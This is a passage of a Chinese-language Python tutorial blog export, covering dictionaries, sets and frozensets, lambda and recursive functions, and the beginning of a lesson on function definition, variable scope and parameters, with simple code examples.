<h4 id="一、字典的创建和使用"><a href="#一、字典的创建和使用" class="headerlink" title="一、字典的创建和使用"></a>一、字典的创建和使用</h4><h5 id="1、创建字典"><a href="#1、创建字典" class="headerlink" title="1、创建字典"></a>1、创建字典</h5><p>字典以键值对（键和值的组合）的方式把数据组织到一起，我们可以通过键找到与之对应的值并进行操作。创建字典可以使用大括号创建。键和值通过冒号分隔开，冒号前为键（key），冒号后是值（value），需要注意的是，字典是允许value重复，但不允key重复，也就是说key是唯一的，key也必须是不可变类型。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">dict1 = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;z7sz&quot;</span>, <span class="string">&quot;title&quot;</span>: <span class="string">&quot;blog&quot;</span>, <span class="string">&quot;tel&quot;</span>: <span class="string">&quot;1234567890&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<p>用字典来保存某组相关信息是远远优于列表和元组。</p>
<p>我们也可以使用内置函数<code>dict</code>或者是字典的生成式语法来创建字典</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># dict函数(构造器)中的每一组参数就是字典中的一组键值对</span></span><br><span class="line">dict1 = <span class="built_in">dict</span>(name=<span class="string">&quot;z7sz&quot;</span>,title=<span class="string">&quot;blog&quot;</span>,tel=<span class="string">&quot;1234567890&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 可以通过Python内置函数zip压缩两个序列并创建字典</span></span><br><span class="line">dict2=<span class="built_in">dict</span>(<span class="built_in">zip</span>([<span class="string">&#x27;name&#x27;</span>,<span class="string">&#x27;title&#x27;</span>,<span class="string">&#x27;tel&#x27;</span>],[<span class="string">&#x27;z7sz&#x27;</span>,<span class="string">&#x27;blog&#x27;</span>,<span class="string">&#x27;1234567890&#x27;</span>]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用字典生成式语法创建字典</span></span><br><span class="line">dict3= &#123;x:y <span class="keyword">for</span> x,y <span class="keyword">in</span> <span class="built_in">zip</span>([<span class="string">&#x27;name&#x27;</span>,<span class="string">&#x27;title&#x27;</span>,<span class="string">&#x27;tel&#x27;</span>],[<span class="string">&#x27;z7sz&#x27;</span>,<span class="string">&#x27;blog&#x27;</span>,<span class="string">&#x27;1234567890&#x27;</span>])&#125;</span><br></pre></td></tr></table></figure>

<p>想知道字典中有多少组数据，依旧用len函数，想对字典进行遍历用for循环，这两点跟之前讲列表元组的时候是一样的。</p>
<h5 id="2、字典的运算"><a href="#2、字典的运算" class="headerlink" title="2、字典的运算"></a>2、字典的运算</h5><p>字典最重要的是成员运算和索引运算，成员运算可以判断指定的key在不在字典中，索引运算可以通过key来获取对应的value或者向字典中插入新的键值对。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">dict1 = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;z7sz&quot;</span>, <span class="string">&quot;title&quot;</span>: <span class="string">&quot;blog&quot;</span>, <span class="string">&quot;tel&quot;</span>: <span class="string">&quot;1234567890&quot;</span>&#125;</span><br><span class="line"><span class="comment">#检查name是否在字典中</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;name&#x27;</span> <span class="keyword">in</span> dict1)  <span class="comment">#True</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#修改title的值</span></span><br><span class="line">dict1[<span class="string">&#x27;title&#x27;</span>] = <span class="string">&#x27;学习笔记&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#通过索引操作插入新的键值对</span></span><br><span class="line">dict1[<span class="string">&#x27;size&#x27;</span>] = <span class="string">&quot;blog.z7sz.top&quot;</span></span><br><span class="line"><span class="built_in">print</span>(dict1)   <span class="comment">#&#123;&#x27;name&#x27;: &#x27;z7sz&#x27;, &#x27;title&#x27;: &#x27;学习笔记&#x27;, &#x27;tel&#x27;: &#x27;1234567890&#x27;, &#x27;size&#x27;: &#x27;blog.z7sz.top&#x27;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 对字典的键进行循环并通索引运算获取键对应的值</span></span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> dict1:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;key&#125;</span>:<span class="subst">&#123;dict1[key]&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>在通过索引运算获取字典中的值时，如指定的键没有在字典中，将会引发<code>KeyError</code>异常。</p>
<h5 id="3、字典的方法"><a href="#3、字典的方法" class="headerlink" title="3、字典的方法"></a>3、字典的方法</h5><p>字典类型的方法基本上都跟字典的键值对操作相关。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">dict1 = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;z7sz&quot;</span>, <span class="string">&quot;title&quot;</span>: <span class="string">&quot;blog&quot;</span>, <span class="string">&quot;tel&quot;</span>: <span class="string">&quot;1234567890&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># get方法可以通过key来取值，如果取不到则返回None或设定的默认值</span></span><br><span class="line"><span class="built_in">print</span>(dict1.get(<span class="string">&#x27;name&#x27;</span>))  <span class="comment">#z7sz</span></span><br><span class="line"><span class="built_in">print</span>(dict1.get(<span class="string">&#x27;name1&#x27;</span>))  <span class="comment">#None</span></span><br><span class="line"><span class="built_in">print</span>(dict1.get(<span class="string">&#x27;name1&#x27;</span>,&#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;None&#x27;</span>&#125;))   <span class="comment">#&#123;&#x27;name&#x27;: &#x27;None&#x27;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取字典中所有的key</span></span><br><span class="line"><span class="built_in">print</span>(dict1.keys())  <span class="comment">#dict_keys([&#x27;name&#x27;, &#x27;title&#x27;, &#x27;tel&#x27;])</span></span><br><span class="line"><span class="comment"># 获取字典中所有的值</span></span><br><span class="line"><span class="built_in">print</span>(dict1.values())  <span class="comment">#dict_values([&#x27;z7sz&#x27;, &#x27;blog&#x27;, &#x27;1234567890&#x27;])</span></span><br><span class="line"><span class="comment"># 获取字典中所有的键值对</span></span><br><span class="line"><span class="built_in">print</span>(dict1.items())  <span class="comment">#dict_items([(&#x27;name&#x27;, &#x27;z7sz&#x27;), (&#x27;title&#x27;, &#x27;blog&#x27;), (&#x27;tel&#x27;, &#x27;1234567890&#x27;)])</span></span><br><span class="line"><span class="comment"># 通过字典方法来对字典进行遍历</span></span><br><span class="line"><span class="keyword">for</span> k,v <span class="keyword">in</span> dict1.items():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;k&#125;</span>:<span class="subst">&#123;v&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 使用pop方法通过键删除对应的键值对并返回该值,pop跟get方法类似，可以设置删除不到值的默认值</span></span><br><span class="line"><span class="comment"># 跟列表一样，删除元素也可以用del关键字来删除，比如del dict1[&#x27;name&#x27;]</span></span><br><span class="line">name=dict1.pop(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(name)  <span class="comment">#&#x27;z7sz&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(dict1) <span class="comment">#&#123;&#x27;title&#x27;: &#x27;blog&#x27;, &#x27;tel&#x27;: &#x27;1234567890&#x27;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># setdefault用于设置新的键值对</span></span><br><span class="line"><span class="comment"># 如果这个键在字典中存在，setdefault返回原来与这个键对应的值</span></span><br><span class="line"><span class="comment"># 如果这个键在字典中不存在，向字典中添加键值对，返回第二个参数的值，默认为None</span></span><br><span class="line">result = dict1.setdefault(<span class="string">&#x27;name&#x27;</span>,<span class="string">&#x27;z7sz1&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(result)  <span class="comment">#z7sz1</span></span><br><span class="line"><span class="built_in">print</span>(dict1)   <span class="comment">#&#123;&#x27;title&#x27;: &#x27;blog&#x27;, &#x27;tel&#x27;: &#x27;1234567890&#x27;, &#x27;name&#x27;: &#x27;z7sz1&#x27;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用update更新字典元素，相同的键会用新值覆盖掉旧值，不同的键会添加到字典中</span></span><br><span class="line">dict1.update(&#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;z7sz2&#x27;</span>&#125;)</span><br><span class="line"><span class="built_in">print</span>(dict1)  <span class="comment">#&#123;&#x27;title&#x27;: &#x27;blog&#x27;, &#x27;tel&#x27;: &#x27;1234567890&#x27;, &#x27;name&#x27;: &#x27;z7sz2&#x27;&#125;</span></span><br><span class="line">dict1.update(a=<span class="number">111</span>,b=<span class="number">222</span>)</span><br><span class="line"><span class="built_in">print</span>(dict1)  <span class="comment">#&#123;&#x27;title&#x27;: &#x27;blog&#x27;, &#x27;tel&#x27;: &#x27;1234567890&#x27;, &#x27;name&#x27;: &#x27;z7sz2&#x27;, &#x27;a&#x27;: 111, &#x27;b&#x27;: 222&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># copy和clear用于复制和清空字典</span></span><br><span class="line">dict2=dict1.copy()</span><br><span class="line"><span class="built_in">print</span>(dict2)  <span class="comment">#&#123;&#x27;title&#x27;: &#x27;blog&#x27;, &#x27;tel&#x27;: &#x27;1234567890&#x27;, &#x27;name&#x27;: &#x27;z7sz2&#x27;, &#x27;a&#x27;: 111, &#x27;b&#x27;: 222&#125;</span></span><br><span class="line">dict2.clear()</span><br><span class="line"><span class="built_in">print</span>(dict2)  <span class="comment">#&#123;&#125;</span></span><br></pre></td></tr></table></figure>

<p>Python程序中的字典跟现实生活中字典非常像，允许我们<strong>以键值对的形式保存数据</strong>，再<strong>通过键索引对应的值</strong>。这是一种非常<strong>有利于数据检索</strong>的数据类型</p>
<h4 id="二、集合的创建和使用"><a href="#二、集合的创建和使用" class="headerlink" title="二、集合的创建和使用"></a>二、集合的创建和使用</h4><p>python中的集合跟数学中的集合几乎是一致，集合具有无序性和互异性，python中的集合数据类型也是一样。无序性说明集合中的元素是没有顺序的，所以集合肯定不能支持索引运算；互异性指的是集合中不能有重复元素，说白点就是集合会对元素进行去重操作。</p>
<h5 id="1、创建集合"><a href="#1、创建集合" class="headerlink" title="1、创建集合"></a>1、创建集合</h5><p>集合也同样用大括号表示，且大括号内至少有一个元素，这是因为空{}会被python定义成空字典。集合也可以用set函数创建，另外，集合中不能包含可变类型数据，集合本身也是可变类型，所以集合中不能包含集合。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">set1=&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="string">&#x27;5&#x27;</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(set1)  <span class="comment">#&#123;1, 2, 3, 4, 5, &#x27;5&#x27;&#125;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(set1))  <span class="comment">#6</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#使用set创建集合,set也可以将列表转换成集合</span></span><br><span class="line">set2=<span class="built_in">set</span>(<span class="string">&#x27;hello&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(set2)  <span class="comment">#&#123;&#x27;l&#x27;, &#x27;h&#x27;, &#x27;e&#x27;, &#x27;o&#x27;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#使用集合生成式</span></span><br><span class="line">set3=&#123;i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)&#125;</span><br><span class="line"><span class="built_in">print</span>(set3)  <span class="comment">#&#123;0, 1, 2, 3, 4&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 集合元素的循环遍历</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> set3:</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure>

<h5 id="2、集合的运算"><a href="#2、集合的运算" class="headerlink" title="2、集合的运算"></a>2、集合的运算</h5><p>Python为集合类型提供了非常丰富的运算符，主要包括：成员运算、交集运算、并集运算、差集运算、比较运算（相等性、子集、超集）等。</p>
<h6 id="2-1、成员运算"><a href="#2-1、成员运算" class="headerlink" title="2.1、成员运算"></a>2.1、成员运算</h6><p>可以通过成员运算<code>in</code>和<code>not in </code>检查元素是否在集合中。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">set1 = &#123;<span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(<span class="number">10</span> <span class="keyword">in</span> set1)        <span class="comment"># False </span></span><br><span class="line"><span class="built_in">print</span>(<span class="number">15</span> <span class="keyword">in</span> set1)        <span class="comment"># True</span></span><br></pre></td></tr></table></figure>

<h6 id="2-2、交并差运算"><a href="#2-2、交并差运算" class="headerlink" title="2.2、交并差运算"></a>2.2、交并差运算</h6><p>Python中的集合跟数学上的集合一样，可以进行交集、并集、差集等运算，而且可以通过运算符和方法调用两种方式来进行操作。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">set1 = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>&#125;</span><br><span class="line">set2 = &#123;<span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">10</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 交集</span></span><br><span class="line"><span class="comment"># 方法一: 使用 &amp; 运算符</span></span><br><span class="line"><span class="built_in">print</span>(set1 &amp; set2)                <span class="comment"># &#123;2, 4, 6&#125;</span></span><br><span class="line"><span class="comment"># 方法二: 使用intersection方法</span></span><br><span class="line"><span class="built_in">print</span>(set1.intersection(set2))    <span class="comment"># &#123;2, 4, 6&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 并集</span></span><br><span class="line"><span class="comment"># 方法一: 使用 | 运算符</span></span><br><span class="line"><span class="built_in">print</span>(set1 | set2)         <span class="comment"># &#123;1, 2, 3, 4, 5, 6, 7, 8, 10&#125;</span></span><br><span class="line"><span class="comment"># 方法二: 使用union方法</span></span><br><span class="line"><span class="built_in">print</span>(set1.union(set2))    <span class="comment"># &#123;1, 2, 3, 4, 5, 6, 7, 8, 10&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 差集</span></span><br><span class="line"><span class="comment"># 方法一: 使用 - 运算符</span></span><br><span class="line"><span class="built_in">print</span>(set1 - set2)              <span class="comment"># &#123;1, 3, 5, 7&#125;</span></span><br><span class="line"><span class="comment"># 方法二: 使用difference方法</span></span><br><span class="line"><span class="built_in">print</span>(set1.difference(set2))    <span class="comment"># &#123;1, 3, 5, 7&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 对称差</span></span><br><span class="line"><span class="comment"># 方法一: 使用 ^ 运算符</span></span><br><span class="line"><span class="built_in">print</span>(set1 ^ set2)                        <span class="comment"># &#123;1, 3, 5, 7, 8, 10&#125;</span></span><br><span class="line"><span class="comment"># 方法二: 使用symmetric_difference方法</span></span><br><span class="line"><span class="built_in">print</span>(set1.symmetric_difference(set2))    <span class="comment"># &#123;1, 3, 5, 7, 8, 10&#125;</span></span><br><span class="line"><span class="comment"># 方法三: 对称差相当于两个集合的并集减去交集</span></span><br><span class="line"><span class="built_in">print</span>((set1 | set2) - (set1 &amp; set2))      <span class="comment"># &#123;1, 3, 5, 7, 8, 10&#125;</span></span><br></pre></td></tr></table></figure>

<h6 id="2-3、比较运算"><a href="#2-3、比较运算" class="headerlink" title="2.3、比较运算"></a>2.3、比较运算</h6><p>两个集合可以用<code>==</code>和<code>!=</code>进行相等性判断，如果两个集合中的元素完全相同，那么<code>==</code>比较的结果就是<code>True</code>，否则就是<code>False</code>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">set1 = &#123;<span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>&#125;</span><br><span class="line">set2 = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;</span><br><span class="line">set3 = set2</span><br><span class="line"><span class="comment"># &lt;运算符表示真子集，&lt;=运算符表示子集</span></span><br><span class="line"><span class="built_in">print</span>(set1 &lt; set2, set1 &lt;= set2)    <span class="comment"># True True</span></span><br><span class="line"><span class="built_in">print</span>(set2 &lt; set3, set2 &lt;= set3)    <span class="comment"># False True</span></span><br><span class="line"><span class="comment"># 通过issubset方法也能进行子集判断</span></span><br><span class="line"><span class="built_in">print</span>(set1.issubset(set2))      <span class="comment"># True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 反过来可以用issuperset或&gt;运算符进行超集判断</span></span><br><span class="line"><span class="built_in">print</span>(set2.issuperset(set1))    <span class="comment"># True</span></span><br><span class="line"><span class="built_in">print</span>(set2 &gt; set1)              <span class="comment"># True</span></span><br></pre></td></tr></table></figure>

<h5 id="3、集合的方法"><a href="#3、集合的方法" class="headerlink" title="3、集合的方法"></a>3、集合的方法</h5><p>python中的集合是可变类型，我们可以通过集合类型的方法为集合添加或删除元素。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 创建一个空集合</span></span><br><span class="line">set1 = <span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过add方法添加元素</span></span><br><span class="line">set1.add(<span class="number">33</span>)</span><br><span class="line">set1.add(<span class="number">55</span>)</span><br><span class="line">set1.update(&#123;<span class="number">1</span>, <span class="number">10</span>, <span class="number">100</span>, <span class="number">1000</span>&#125;)</span><br><span class="line"><span class="built_in">print</span>(set1)    <span class="comment"># &#123;33, 1, 100, 55, 1000, 10&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过discard方法删除指定元素</span></span><br><span class="line">set1.discard(<span class="number">100</span>)</span><br><span class="line">set1.discard(<span class="number">99</span>)</span><br><span class="line"><span class="built_in">print</span>(set1)    <span class="comment"># &#123;1, 10, 33, 55, 1000&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过remove方法删除指定元素，建议先做成员运算再删除</span></span><br><span class="line"><span class="comment"># 否则元素如果不在集合中就会引发KeyError异常</span></span><br><span class="line"><span class="keyword">if</span> <span class="number">10</span> <span class="keyword">in</span> set1:</span><br><span class="line">    set1.remove(<span class="number">10</span>)</span><br><span class="line"><span class="built_in">print</span>(set1)    <span class="comment"># &#123;33, 1, 55, 1000&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pop方法可以从集合中随机删除一个元素并返回该元素</span></span><br><span class="line"><span class="built_in">print</span>(set1.pop())</span><br><span class="line"></span><br><span class="line"><span class="comment"># clear方法可以清空整个集合</span></span><br><span class="line">set1.clear()</span><br><span class="line"><span class="built_in">print</span>(set1)    <span class="comment"># set()</span></span><br></pre></td></tr></table></figure>

<h5 id="4、不可变集合"><a href="#4、不可变集合" class="headerlink" title="4、不可变集合"></a>4、不可变集合</h5><p>python除了普通的集合之外，还有一种不可变类型的集合，叫<code>frozenset</code>。<code>set</code>跟<code>frozenset</code>的区别就如同<code>list</code>跟<code>tuple</code>的区别，<code>frozenset</code>由于是不可变类型，能够计算出哈希码，因此它可以作为<code>set</code>中的元素。除了不能添加和删除元素，<code>frozenset</code>在其他方面跟<code>set</code>基本是一样的。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">set1 = <span class="built_in">frozenset</span>(&#123;<span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>&#125;)</span><br><span class="line">set2 = <span class="built_in">frozenset</span>(<span class="built_in">range</span>(<span class="number">1</span>, <span class="number">6</span>))</span><br><span class="line"><span class="built_in">print</span>(set1 &amp; set2)    <span class="comment"># frozenset(&#123;1, 3, 5&#125;)</span></span><br><span class="line"><span class="built_in">print</span>(set1 | set2)    <span class="comment"># frozenset(&#123;1, 2, 3, 4, 5, 7&#125;)</span></span><br><span class="line"><span class="built_in">print</span>(set1 - set2)    <span class="comment"># frozenset(&#123;7&#125;)</span></span><br><span class="line"><span class="built_in">print</span>(set1 &lt; set2)    <span class="comment"># False</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python基础</tag>
      </tags>
  </entry>
  <entry>
    <title>匿名函数和递归函数</title>
    <url>/post/4bb85501.html</url>
    <content><![CDATA[<hr>
<blockquote>
<p>本章概述：python基础——匿名函数和递归函数</p>
</blockquote>
<hr>
<span id="more"></span>

<h4 id="一、匿名函数"><a href="#一、匿名函数" class="headerlink" title="一、匿名函数"></a>一、匿名函数</h4><p>在使用函数的时候，如果作为参数或者返回值的函数本身非常简单，一行代码就能够完成，那么我们可以使用lambda函数来表示，普通函数需要函数名来申明，lambda函数不需要函数名，所以也叫匿名函数。匿名函数只能有一行代码，代码中的表达式产生的运算结果就是这个匿名函数的返回值，匿名函数只能一些比较简单的表达式，不能做复杂的计算。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">func=<span class="keyword">lambda</span> x,y:x+y</span><br><span class="line"><span class="built_in">print</span>(func(<span class="number">10</span>,<span class="number">12</span>))  <span class="comment">#22</span></span><br></pre></td></tr></table></figure>

<p>如果需要使用加减乘除这种简单的二元函数，也可以用Lambda函数来书写</p>
<h4 id="二、递归函数"><a href="#二、递归函数" class="headerlink" title="二、递归函数"></a>二、递归函数</h4><p>递归函数指的是函数自己调用自己，比如求阶乘，我们可以使用递归调用的方式。但是递归函数一定要保证递归的边界，递归次数过多会导致栈溢出，当递归次数过多时，那我们就不应该使用递归调用方式来做。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">Factorial</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">if</span> n <span class="keyword">in</span> (<span class="number">0</span>,<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> n*Factorial(n-<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>上面的例子通过递归调用的方式来求阶乘。当n&#x3D;1000时则会报错，表示已经达到最大的递归次数。</p>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python基础</tag>
      </tags>
  </entry>
  <entry>
    <title>函数的基本使用</title>
    <url>/post/f38cf25.html</url>
    <content><![CDATA[<hr>
<blockquote>
<p>本章概述：python基础——函数的基本使用</p>
</blockquote>
<hr>
<span id="more"></span>

<h4 id="一、python的函数"><a href="#一、python的函数" class="headerlink" title="一、python的函数"></a>一、python的函数</h4><h5 id="1、函数的定义"><a href="#1、函数的定义" class="headerlink" title="1、函数的定义"></a>1、函数的定义</h5><p>在Python中可以使用<code>def</code>关键字来定义函数，而函数执行完成后我们会通过<code>return</code>关键字来返回函数的执行结果。函数的作用在于将大量重复的代码封装起来，方便重复调用。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;不带参数&quot;</span>)</span><br><span class="line">get()   <span class="comment">#不带参数</span></span><br></pre></td></tr></table></figure>

<p>上面的例子就是一个简单的函数，并且该函数是不带参数的。</p>
<h5 id="2、变量的作用域"><a href="#2、变量的作用域" class="headerlink" title="2、变量的作用域"></a>2、变量的作用域</h5><p>变量起作用的范围称为变量的作用域，不同作用域内同名变量之间互不影响。变量分为全局变量和局部变量。</p>
<p>全局变量：在函数或类之外定义的变量，作用域从定义的位置开始到整个模块（也可以理解成py文件）结束。全局变量一般作为常量使用，即该变量是不变的。函数内要改变全局变量的值，需要使用 global 声明一下。</p>
<p>局部变量：在函数体内申明的变量，只在函数内起作用。</p>
<p>局部变量的查询和访问速度比全局变量快，优先考虑使用，尤其是在循环的时候。在特别强调效率的地方或者循环次数较多的地方，可以通过将全局变量转为局部变量提高运行速度。总而言之，在循环结构中尽量不定义变量（包括不定义方法）。比如在for循环里头需要使用time.sleep()进行暂停，这时可以现在循环外把暂停定义好，a&#x3D;time.time，然后在循环内直接使用a(1)，这样能使运行的速度提升很多</p>
<p>通过locals()和globals()函数可以打印出所有的局部变量和全局变量。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">a=<span class="number">1</span> <span class="comment">#全局变量</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get</span>():</span><br><span class="line">    b=<span class="number">2</span> <span class="comment">#局部变量</span></span><br><span class="line">    <span class="built_in">print</span>(b)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">globals</span>()) <span class="comment">#打印全局变量</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">locals</span>())  <span class="comment">#打印局部变量</span></span><br><span class="line"></span><br><span class="line">get()</span><br></pre></td></tr></table></figure>

<p>全局变量和局部变量的效率比较</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">global_test</span>():</span><br><span class="line">    start=time.time()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000000</span>):</span><br><span class="line">        a=random.randint(<span class="number">1</span>,<span class="number">100</span>)</span><br><span class="line">    end=time.time()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;耗时&#123;0&#125;&quot;</span>.<span class="built_in">format</span>((end-start)))</span><br><span class="line"></span><br><span class="line">global_test()  <span class="comment">#耗时5.018017768859863</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">local_test</span>():</span><br><span class="line">    start=time.time()</span><br><span class="line">    a=random.randint</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000000</span>):</span><br><span class="line">        a(<span class="number">1</span>,<span class="number">100</span>)</span><br><span class="line">    end=time.time()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;耗时&#123;0&#125;&quot;</span>.<span class="built_in">format</span>((end-start)))</span><br><span class="line"> </span><br><span class="line">local_test()  <span class="comment">#耗时4.793867349624634</span></span><br></pre></td></tr></table></figure>

<p>运行了好几次，结果都是下面的函数比上面的函数更省时间。</p>
<h4 id="二、函数的参数"><a href="#二、函数的参数" class="headerlink" title="二、函数的参数"></a>二、函数的参数</h4><h5 id="1、参数默认值"><a href="#1、参数默认值" class="headerlink" title="1、参数默认值"></a>1、参数默认值</h5><p>python函数可以没有参数，参数可以有默认值。带默认值的参数必须放在不带默认值的参数之后</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">x,y,z=<span class="number">10</span></span>):</span><br><span class="line">    <span class="keyword">return</span> x + y + z</span><br><span class="line"></span><br><span class="line"><span class="comment">#如果z没有指定数值，则默认为10</span></span><br><span class="line">get(<span class="number">10</span>,<span class="number">12</span>)   <span class="comment">#32</span></span><br><span class="line"><span class="comment">#z指定数值，则被赋值为11</span></span><br><span class="line">get(<span class="number">10</span>,<span class="number">12</span>,<span class="number">11</span>)  <span class="comment">#33</span></span><br></pre></td></tr></table></figure>

<h5 id="2、不定长参数"><a href="#2、不定长参数" class="headerlink" title="2、不定长参数"></a>2、不定长参数</h5><p>不定长参数允许我们输入0或者任意个参数，当一个函数的参数不明确个数时，就需要使用不定长参数，不定长参数用*表示。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 用星号表达式来表示args可以接收0个或任意多个参数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">*args</span>):</span><br><span class="line">    <span class="built_in">sum</span>=<span class="number">0</span></span><br><span class="line">    <span class="comment"># 可变参数可以放在for循环中取出每个参数的值</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> args:</span><br><span class="line">        <span class="built_in">sum</span>+=i</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sum</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 在调用get函数时可以传入0个或任意多个参数</span></span><br><span class="line"><span class="built_in">print</span>(get(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>))</span><br></pre></td></tr></table></figure>

<p>带参数名的不定长参数用**表示。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">**kwargs</span>):</span><br><span class="line">    <span class="built_in">sum</span>=<span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 字典类型</span></span><br><span class="line">    <span class="built_in">print</span>(kwargs)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> kwargs.values():</span><br><span class="line">        <span class="built_in">sum</span>+=i</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sum</span></span><br><span class="line"><span class="built_in">print</span>(get(a=<span class="number">3</span>,b=<span class="number">4</span>,d=<span class="number">5</span>))</span><br></pre></td></tr></table></figure>

<h5 id="3、命名关键字参数"><a href="#3、命名关键字参数" class="headerlink" title="3、命名关键字参数"></a>3、命名关键字参数</h5><p>所谓命名关键字参数，就是写在<em>号后的参数。它的作用在于在传入参数时必须以<code>参数名=参数值</code>的方式传参，并且不能传入</em>号后面没有明确的参数。</p>
